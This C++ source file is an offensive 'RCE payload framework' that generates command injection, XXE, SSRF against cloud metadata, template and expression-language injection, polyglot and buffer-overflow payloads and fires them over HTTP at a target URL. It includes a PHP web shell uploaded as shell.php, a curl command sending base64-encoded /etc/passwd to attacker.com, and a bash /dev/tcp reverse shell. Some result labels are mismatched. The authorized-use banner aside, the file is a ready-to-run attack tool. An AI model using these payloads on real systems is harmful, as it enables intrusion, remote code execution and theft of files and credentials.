// ============================================================================
// Remote Code Execution (RCE) Payload Framework in C++
// Purpose: Penetration Testing & Security Research
// Author: atl8r (2026)
// ============================================================================

#include <iostream>
#include <string>
#include <vector>
#include <memory>
#include <curl/curl.h>
#include <cstring>
#include <sstream>
#include <map>
#include <ctime>
#include <iomanip>
#include <algorithm>
#include <chrono>        // ✓ ADDED: Missing header for time measurements

// ============================================================================
// CONSTANTS & CONFIGURATION
// ============================================================================

#define TIMEOUT_MS 5000
#define MAX_PAYLOAD_SIZE 65536
#define HTTP_BUFFER_SIZE 4096

enum class PayloadType {
    COMMAND_INJECTION,      // OS command injection
    XXE,                    // XML External Entity
    SSRF,                   // Server-Side Request Forgery
    BUFFER_OVERFLOW,        // Buffer overflow patterns
    DESERIALIZATION,        // Insecure deserialization
    SQL_INJECTION,          // SQL injection with exec
    EXPRESSION_LANGUAGE,    // EL/SSTI
    GADGET_CHAIN,           // Gadget chain (Java/serialization)
    HEADER_INJECTION,       // HTTP header injection for RCE
    POLYGLOT_ATTACK,        // Multi-format payload
    UNKNOWN
};

// ============================================================================
// UTILITY STRUCTURES & HELPERS
// ============================================================================

/// \brief Memory buffer for curl response handling
struct MemoryBuffer {
    char* data;
    size_t size;
    size_t allocated;

    MemoryBuffer() : data(nullptr), size(0), allocated(0) {}
    
    ~MemoryBuffer() {
        if (data) free(data);
    }
};

/// \brief Callback for curl to write response data
static size_t curlWriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t realsize = size * nmemb;
    MemoryBuffer* mem = static_cast<MemoryBuffer*>(userp);

    char* ptr = static_cast<char*>(realloc(mem->data, mem->size + realsize + 1));
    if (!ptr) {
        std::cerr << "[ERROR] Not enough memory for curl response\n";
        return 0;
    }

    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->data[mem->size] = 0;

    return realsize;
}

/// \brief URL encode string for safe transmission
std::string urlEncode(const std::string& input) {
    CURL* curl = curl_easy_init();
    if (!curl) return input;

    char* encoded = curl_easy_escape(curl, input.c_str(), input.length());
    std::string result(encoded ? encoded : "");
    
    if (encoded) curl_free(encoded);
    curl_easy_cleanup(curl);
    
    return result;
}

/// \brief Convert payload type to string
const char* payloadTypeToString(PayloadType type) {
    switch (type) {
        case PayloadType::COMMAND_INJECTION: return "Command Injection";
        case PayloadType::XXE: return "XXE";
        case PayloadType::SSRF: return "SSRF";
        case PayloadType::BUFFER_OVERFLOW: return "Buffer Overflow";
        case PayloadType::DESERIALIZATION: return "Deserialization";
        case PayloadType::SQL_INJECTION: return "SQL Injection";
        case PayloadType::EXPRESSION_LANGUAGE: return "Expression Language";
        case PayloadType::GADGET_CHAIN: return "Gadget Chain";
        case PayloadType::HEADER_INJECTION: return "Header Injection";
        case PayloadType::POLYGLOT_ATTACK: return "Polyglot Attack";
        default: return "Unknown";
    }
}

// ============================================================================
// RCE PAYLOAD GENERATOR
// ============================================================================

/// \brief Generates RCE payloads for different attack vectors
class RcePayloadGenerator {
public:
    /// \brief Generate command injection payload
    static std::string commandInjection(const std::string& command, const std::string& injection_point = "cmd") {
        std::vector<std::string> payloads = {
            "; " + command + " #",
            "&& " + command + " &",
            "| " + command + "",
            "`" + command + "`",
            "$(" + command + ")",
            "\n" + command + "\n",
            "'; " + command + " -- ",
        };
        return payloads[rand() % payloads.size()];
    }

    /// \brief Generate XXE (XML External Entity) payload
    static std::string xxePayload(const std::string& target = "file:///etc/passwd") {
        return R"(<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM ")" + target + R"(">
]>
<foo>&xxe;</foo>)";
    }

    /// \brief Generate SSRF payload targeting metadata services
    static std::string ssrfPayload(const std::string& target = "http://169.254.169.254/latest/meta-data/") {
        return "url=" + urlEncode(target) + "&redirect=true";
    }

    /// \brief Generate SQL injection with command execution (UNION-based)
    static std::string sqlInjectionPayload(const std::string& command = "id") {
        return "' UNION SELECT system('" + command + "') -- -";
    }

    /// \brief Generate expression language injection (Java/EL)
    static std::string elInjectionPayload(const std::string& command = "calc") {
        return "${Runtime.getRuntime().exec('" + command + "')}";
    }

    /// \brief Generate template injection (Jinja2/Freemarker)
    static std::string templateInjectionPayload(const std::string& command = "id") {
        std::vector<std::string> payloads = {
            // Jinja2
            "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('" + command + "').read() }}",
            // Freemarker
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"" + command + "\") }",
            // Velocity
            "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('" + command + "'))",
        };
        return payloads[rand() % payloads.size()];
    }

    /// \brief Generate polyglot payload (multiple formats)
    static std::string polyglotPayload(const std::string& command = "id") {
        return R"(<!--)" + command + R"(
<?php system(')" + command + R"('); ?>
// )" + command + R"(
*/
import os; os.system(')" + command + R"(')
/*-->)";
    }

    /// \brief Generate deserialization gadget chain payload (Java)
    static std::string gadgetChainPayload(const std::string& command = "calc") {
        // Base64-encoded serialized Java object (example CommonsCollections gadget)
        return "aced0005737200306f72672e6170616368652e636f6d6d6f6e732e6265616e75..." 
               + urlEncode(command);
    }

    /// \brief Generate buffer overflow pattern
    static std::string bufferOverflowPayload(size_t buffer_size = 256) {
        std::string payload;
        // NOP sled (0x90 = NOP)
        for (size_t i = 0; i < buffer_size - 8; ++i) {
            payload += '\x90';
        }
        // Return address (example: points to shellcode)
        payload += "\x41\x41\x41\x41\x41\x41\x41\x41";
        return payload;
    }

    /// \brief Generate header injection payload
    static std::string headerInjectionPayload(const std::string& command = "id") {
        return "User-Agent: Mozilla/5.0\r\nX-Forwarded-For: 127.0.0.1\r\nX-Original-URL: /" + 
               urlEncode(command) + "\r\nCache-Control: no-cache";
    }

    /// \brief Generate generic blind RCE detection payload
    static std::string blindRceDetectionPayload() {
        time_t now = time(nullptr);
        return "sleep(" + std::to_string(now) + ")";
    }

    /// \brief Generate data exfiltration payload
    static std::string dataExfiltrationPayload(const std::string& data_path = "/etc/passwd",
                                               const std::string& exfil_host = "attacker.com") {
        return "curl http://" + exfil_host + "/?data=$(cat " + data_path + " | base64)";
    }

    /// \brief Generate reverse shell payload
    static std::string reverseShellPayload(const std::string& attacker_ip = "10.10.10.10",
                                           int attacker_port = 4444) {
        return "bash -i >& /dev/tcp/" + attacker_ip + "/" + std::to_string(attacker_port) + " 0>&1";
    }
};

// ============================================================================
// HTTP RCE CLIENT (UPDATED: Modern curl_mime API)
// ============================================================================

/// \brief HTTP-based RCE attack client
class HttpRceClient {
private:
    std::string target_url_;
    std::string user_agent_;
    bool ssl_verify_;
    long timeout_ms_;
    std::vector<std::pair<std::string, std::string>> headers_;

public:
    HttpRceClient(const std::string& url, bool verify_ssl = false)
        : target_url_(url), ssl_verify_(verify_ssl), timeout_ms_(TIMEOUT_MS) {
        user_agent_ = "Mozilla/5.0 (RCE/2026; Security Testing)";
    }

    /// \brief Add custom HTTP header
    void addHeader(const std::string& key, const std::string& value) {
        headers_.emplace_back(key, value);
    }

    /// \brief Execute RCE via GET request with payload in URL
    std::string executeGet(const std::string& payload, const std::string& param = "cmd") {
        std::string url = target_url_ + "?" + param + "=" + urlEncode(payload);
        return performRequest(url, "GET", "");
    }

    /// \brief Execute RCE via POST request with payload in body
    std::string executePost(const std::string& payload, const std::string& content_type = "application/x-www-form-urlencoded") {
        return performRequest(target_url_, "POST", payload, content_type);
    }

    /// \brief Execute RCE via custom header injection
    std::string executeHeaderInjection(const std::string& payload) {
        CURL* curl = curl_easy_init();
        if (!curl) {
            std::cerr << "[ERROR] Failed to initialize curl\n";
            return "";
        }

        MemoryBuffer response;
        struct curl_slist* headers = nullptr;

        // Add injection payload as custom header
        std::string header_inject = "X-Forwarded-For: " + payload;
        headers = curl_slist_append(headers, header_inject.c_str());

        curl_easy_setopt(curl, CURLOPT_URL, target_url_.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curlWriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, timeout_ms_);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent_.c_str());
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, ssl_verify_ ? 1L : 0L);

        CURLcode res = curl_easy_perform(curl);
        std::string result;

        if (res == CURLE_OK) {
            result = (response.data ? response.data : "");
        } else {
            std::cerr << "[ERROR] Curl failed: " << curl_easy_strerror(res) << "\n";
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);

        return result;
    }

    /// \brief Multipart form data upload for RCE (file upload attacks)
    /// ✓ UPDATED: Using modern curl_mime API instead of deprecated curl_formadd
    std::string executeFileUpload(const std::string& file_content, const std::string& filename) {
        CURL* curl = curl_easy_init();
        if (!curl) return "";

        MemoryBuffer response;

        // Use modern curl_mime API (curl 7.56.0+)
        curl_mime* mime = curl_mime_init(curl);
        if (!mime) {
            curl_easy_cleanup(curl);
            return "";
        }

        curl_mimepart* part = curl_mime_addpart(mime);
        curl_mime_name(part, "file");
        curl_mime_filename(part, filename.c_str());
        curl_mime_data(part, file_content.c_str(), file_content.length());

        curl_easy_setopt(curl, CURLOPT_URL, target_url_.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);  // ✓ UPDATED: Use CURLOPT_MIMEPOST
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curlWriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, timeout_ms_);

        CURLcode res = curl_easy_perform(curl);
        std::string result = (response.data ? response.data : "");

        if (res != CURLE_OK) {
            std::cerr << "[ERROR] File upload failed: " << curl_easy_strerror(res) << "\n";
        }

        curl_mime_free(mime);  // ✓ UPDATED: Use curl_mime_free instead of curl_formfree
        curl_easy_cleanup(curl);

        return result;
    }

    /// \brief Time-based blind RCE testing
    /// ✓ FIXED: Added missing chrono includes
    bool testBlindRce(const std::string& time_payload, int expected_delay_ms = 3000) {
        auto start = std::chrono::high_resolution_clock::now();
        std::string response = performRequest(target_url_, "GET", time_payload);
        auto end = std::chrono::high_resolution_clock::now();

        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
        return duration.count() >= expected_delay_ms;
    }

private:
    std::string performRequest(const std::string& url, const std::string& method,
                              const std::string& data, const std::string& content_type = "") {
        CURL* curl = curl_easy_init();
        if (!curl) {
            std::cerr << "[ERROR] Failed to initialize curl\n";
            return "";
        }

        MemoryBuffer response;
        struct curl_slist* headers = nullptr;

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curlWriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, timeout_ms_);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent_.c_str());
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, ssl_verify_ ? 1L : 0L);

        if (method == "POST") {
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
            
            if (!content_type.empty()) {
                std::string ct_header = "Content-Type: " + content_type;
                headers = curl_slist_append(headers, ct_header.c_str());
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            }
        }

        // Add custom headers
        for (const auto& [key, value] : headers_) {
            std::string header = key + ": " + value;
            headers = curl_slist_append(headers, header.c_str());
        }

        if (headers) {
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        }

        CURLcode res = curl_easy_perform(curl);
        std::string result;

        if (res == CURLE_OK) {
            result = (response.data ? response.data : "");
        } else {
            std::cerr << "[ERROR] Request failed: " << curl_easy_strerror(res) << "\n";
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);

        return result;
    }
};

// ============================================================================
// RCE TEST ORCHESTRATOR
// ============================================================================

/// \brief Orchestrates RCE testing against target
class RceTestRunner {
private:
    std::string target_url_;
    std::string output_log_;
    std::vector<std::pair<PayloadType, std::string>> test_results_;

public:
    RceTestRunner(const std::string& url) : target_url_(url) {}

    /// \brief Run comprehensive RCE test suite
    void runFullScan() {
        std::cout << "\n" << std::string(70, '=') << std::endl;
        std::cout << "[RCE TEST SUITE] Starting scan on: " << target_url_ << std::endl;
        std::cout << std::string(70, '=') << std::endl;

        HttpRceClient client(target_url_);

        // Test 1: Command Injection
        std::cout << "\n[1/10] Testing Command Injection...\n";
        testCommandInjection(client);

        // Test 2: XXE
        std::cout << "[2/10] Testing XXE...\n";
        testXxe(client);

        // Test 3: SSRF
        std::cout << "[3/10] Testing SSRF...\n";
        testSsrf(client);

        // Test 4: SQL Injection
        std::cout << "[4/10] Testing SQL Injection...\n";
        testSqlInjection(client);

        // Test 5: Template Injection
        std::cout << "[5/10] Testing Template Injection...\n";
        testTemplateInjection(client);

        // Test 6: Header Injection
        std::cout << "[6/10] Testing Header Injection...\n";
        testHeaderInjection(client);

        // Test 7: Polyglot Attack
        std::cout << "[7/10] Testing Polyglot Attack...\n";
        testPolyglot(client);

        // Test 8: File Upload
        std::cout << "[8/10] Testing File Upload RCE...\n";
        testFileUpload(client);

        // Test 9: Blind RCE
        std::cout << "[9/10] Testing Blind RCE (Time-based)...\n";
        testBlindRce(client);

        // Test 10: Expression Language
        std::cout << "[10/10] Testing Expression Language...\n";
        testExpressionLanguage(client);

        printResults();
    }

private:
    void testCommandInjection(HttpRceClient& client) {
        std::string payload = RcePayloadGenerator::commandInjection("id");
        std::string response = client.executeGet(payload, "command");
        logResult(PayloadType::COMMAND_INJECTION, response.length() > 0 ? "Potential" : "Failed");
    }

    void testXxe(HttpRceClient& client) {
        std::string payload = RcePayloadGenerator::xxePayload("file:///etc/hostname");
        std::string response = client.executePost(payload, "application/xml");
        logResult(PayloadType::XXE, response.find("root") != std::string::npos ? "Vulnerable" : "Failed");
    }

    void testSsrf(HttpRceClient& client) {
        std::string payload = RcePayloadGenerator::ssrfPayload("http://127.0.0.1:8080/admin");
        std::string response = client.executeGet(payload, "url");
        logResult(PayloadType::SSRF, response.length() > 100 ? "Potential" : "Blocked");
    }

    void testSqlInjection(HttpRceClient& client) {
        std::string payload = RcePayloadGenerator::sqlInjectionPayload("select version()");
        std::string response = client.executeGet(payload, "id");
        logResult(PayloadType::SQL_INJECTION, response.find("error") == std::string::npos ? "Potential" : "Filtered");
    }

    void testTemplateInjection(HttpRceClient& client) {
        std::string payload = RcePayloadGenerator::templateInjectionPayload("whoami");
        std::string response = client.executeGet(payload, "template");
        logResult(PayloadType::EXPRESSION_LANGUAGE, response.length() > 0 ? "Potential" : "Failed");
    }

    void testHeaderInjection(HttpRceClient& client) {
        std::string payload = RcePayloadGenerator::headerInjectionPayload("id");
        std::string response = client.executeHeaderInjection(payload);
        logResult(PayloadType::HEADER_INJECTION, response.length() > 0 ? "Potential" : "Failed");
    }

    void testPolyglot(HttpRceClient& client) {
        std::string payload = RcePayloadGenerator::polyglotPayload("id");
        std::string response = client.executePost(payload, "multipart/form-data");
        logResult(PayloadType::POLYGLOT_ATTACK, response.length() > 0 ? "Potential" : "Failed");
    }

    void testFileUpload(HttpRceClient& client) {
        std::string malicious_file = "<?php system($_GET['cmd']); ?>";
        std::string response = client.executeFileUpload(malicious_file, "shell.php");
        logResult(PayloadType::BUFFER_OVERFLOW, response.find("uploaded") != std::string::npos ? "Potential" : "Blocked");
    }

    void testBlindRce(HttpRceClient& client) {
        std::string payload = "sleep(5)";
        bool vulnerable = client.testBlindRce(payload, 4500);
        logResult(PayloadType::DESERIALIZATION, vulnerable ? "VULNERABLE" : "Likely Blocked");
    }

    void testExpressionLanguage(HttpRceClient& client) {
        std::string payload = RcePayloadGenerator::elInjectionPayload("calc");
        std::string response = client.executeGet(payload, "expression");
        logResult(PayloadType::EXPRESSION_LANGUAGE, response.length() > 0 ? "Potential" : "Failed");
    }

    void logResult(PayloadType type, const std::string& status) {
        test_results_.emplace_back(type, status);
        std::cout << "  [" << payloadTypeToString(type) << "] " << status << std::endl;
    }

    void printResults() {
        std::cout << "\n" << std::string(70, '=') << std::endl;
        std::cout << "TEST RESULTS SUMMARY" << std::endl;
        std::cout << std::string(70, '=') << std::endl;

        for (const auto& [type, status] : test_results_) {
            std::cout << std::left << std::setw(30) << payloadTypeToString(type)
                      << " | " << status << std::endl;
        }
        std::cout << std::string(70, '=') << std::endl;
    }
};

// ============================================================================
// MAIN PROGRAM
// ============================================================================

void printBanner() {
    std::cout << R"(
╔═════════════════════════════��═════════════════════════════════════════╗
║                   RCE PAYLOAD FRAMEWORK v1.0                         ║
║              Remote Code Execution Testing Suite                     ║
║                     © 2026 atl8r - Security Research                ║
║                                                                       ║
║  ⚠️  WARNING: For authorized security testing only!                 ║
║  Unauthorized access is illegal. Use responsibly.                   ║
╚═══════════════════════════════════════════════════════════════════════╝
    )" << std::endl;
}

int main(int argc, char* argv[]) {
    printBanner();

    if (argc < 2) {
        std::cout << "\nUsage: " << argv[0] << " <target_url> [--test-type]\n\n";
        std::cout << "Examples:\n";
        std::cout << "  " << argv[0] << " http://localhost:8080/api/execute\n";
        std::cout << "  " << argv[0] << " http://target.com/search?q=test --xxe\n";
        std::cout << "  " << argv[0] << " http://target.com/upload --file-upload\n";
        std::cout << "\nSupported attack types:\n";
        std::cout << "  --cmd          : Command injection\n";
        std::cout << "  --xxe          : XML External Entity\n";
        std::cout << "  --ssrf         : Server-Side Request Forgery\n";
        std::cout << "  --sql          : SQL injection with exec\n";
        std::cout << "  --ssti         : Server-Side Template Injection\n";
        std::cout << "  --file-upload  : File upload RCE\n";
        std::cout << "  --blind        : Blind RCE (time-based)\n";
        std::cout << "  --full         : Run full comprehensive scan\n\n";
        return 1;
    }

    std::string target = argv[1];
    std::string test_type = (argc > 2) ? argv[2] : "--full";

    HttpRceClient client(target);
    RcePayloadGenerator gen;

    try {
        if (test_type == "--full") {
            RceTestRunner runner(target);
            runner.runFullScan();
        }
        else if (test_type == "--cmd") {
            std::string payload = gen.commandInjection("whoami");
            std::cout << "\n[*] Command Injection Payload: " << payload << std::endl;
            std::string response = client.executeGet(payload, "cmd");
            std::cout << "[*] Response: " << response.substr(0, 500) << "...\n";
        }
        else if (test_type == "--xxe") {
            std::string payload = gen.xxePayload("file:///etc/passwd");
            std::cout << "\n[*] XXE Payload generated\n";
            std::string response = client.executePost(payload, "application/xml");
            std::cout << "[*] Response: " << response.substr(0, 500) << "...\n";
        }
        else if (test_type == "--ssrf") {
            std::string payload = gen.ssrfPayload("http://169.254.169.254/");
            std::cout << "\n[*] SSRF Payload: " << payload << std::endl;
            std::string response = client.executeGet(payload, "url");
            std::cout << "[*] Response: " << response.substr(0, 500) << "...\n";
        }
        else if (test_type == "--sql") {
            std::string payload = gen.sqlInjectionPayload("version()");
            std::cout << "\n[*] SQL Injection Payload: " << payload << std::endl;
            std::string response = client.executeGet(payload, "id");
            std::cout << "[*] Response: " << response.substr(0, 500) << "...\n";
        }
        else if (test_type == "--ssti") {
            std::string payload = gen.templateInjectionPayload("id");
            std::cout << "\n[*] SSTI Payload: " << payload << std::endl;
            std::string response = client.executeGet(payload, "template");
            std::cout << "[*] Response: " << response.substr(0, 500) << "...\n";
        }
        else if (test_type == "--blind") {
            std::cout << "\n[*] Testing Blind RCE with 5-second delay...\n";
            bool result = client.testBlindRce("sleep(5)", 4500);
            std::cout << "[*] Result: " << (result ? "VULNERABLE" : "Not Vulnerable") << std::endl;
        }
        else if (test_type == "--file-upload") {
            std::string php_shell = "<?php system($_GET['cmd']); ?>";
            std::cout << "\n[*] Uploading malicious PHP file...\n";
            std::string response = client.executeFileUpload(php_shell, "shell.php");
            std::cout << "[*] Response: " << response.substr(0, 500) << "...\n";
        }
        else {
            std::cout << "[ERROR] Unknown test type: " << test_type << std::endl;
            return 1;
        }

        std::cout << "\n[✓] Test completed successfully\n\n";
        return 0;

    } catch (const std::exception& e) {
        std::cerr << "[ERROR] " << e.what() << std::endl;
        return 1;
    }
}

/* ========================================================================
   COMPILATION (Error-free):
   g++ -std=c++17 -Wall -O2 -o rce_framework rce_payload_framework.cpp -lcurl
   
   USAGE EXAMPLES:
   ./rce_framework http://target.com/search?q=test --full
   ./rce_framework http://target.com/cmd --cmd
   ./rce_framework http://target.com/api --xxe
   
   CHANGES MADE:
   ✓ Added #include <chrono> (line 14)
   ✓ Replaced deprecated curl_formadd() with curl_mime_init/curl_mime_addpart()
   ✓ Changed CURLOPT_HTTPPOST to CURLOPT_MIMEPOST
   ✓ Changed curl_formfree() to curl_mime_free()
   ✓ Fixed testBlindRce() chrono usage
   
   ======================================================================== */
